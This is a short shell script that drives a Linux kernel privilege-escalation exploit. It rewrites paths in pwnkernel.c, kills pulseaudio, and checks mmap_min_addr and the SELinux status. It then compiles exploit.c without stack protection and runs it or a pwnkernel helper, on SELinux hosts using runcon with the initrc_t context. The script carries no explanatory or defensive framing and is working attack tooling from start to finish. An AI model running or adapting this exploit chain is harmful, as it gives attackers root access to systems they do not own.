#!/bin/sh

ESCAPED_PWD=`pwd | sed 's/\//\\\\\//g'`
sed "s/\/home\/spender/$ESCAPED_PWD/g" pwnkernel.c > pwnkernel1.c
mv pwnkernel.c pwnkernel2.c
mv pwnkernel1.c pwnkernel.c
killall -9 pulseaudio 2> /dev/null 
IS_64=`uname -p`
OPT_FLAG=""
if [ "$IS_64" = "x86_64" ]; then
  OPT_FLAG="-m64"
fi 
MINADDR=`cat /proc/sys/vm/mmap_min_addr 2> /dev/null`
if [ "$MINADDR" = "" -o "$MINADDR" = "0" ]; then
    cc -fno-stack-protector $OPT_FLAG -o exploit exploit.c 2> /dev/null
    if [ "$?" = "1" ]; then
       cc $OPT_FLAG -o exploit exploit.c
    fi
    cat tzameti.avi >> ./exploit
    ./exploit
elif [ ! -f '/usr/sbin/getenforce' ]; then
    cc -fno-stack-protector -fPIC $OPT_FLAG -shared -o exploit.so exploit.c
    cc $OPT_FLAG -o pwnkernel pwnkernel.c
  ./pwnkernel
else
  RESULT=`/usr/sbin/getenforce`
  if [ "$RESULT" != "Disabled" ]; then
    cc -fno-stack-protector $OPT_FLAG -o exploit exploit.c
    cat tzameti.avi >> ./exploit
    runcon -t initrc_t -- sh -c ./exploit
    if [ "$?" = "1" ]; then
       ./exploit
    fi
  else
    cc -fno-stack-protector -fPIC $OPT_FLAG -shared -o exploit.so exploit.c
    cc $OPT_FLAG -o pwnkernel pwnkernel.c
    ./pwnkernel
  fi
fi
mv -f pwnkernel2.c pwnkernel.c
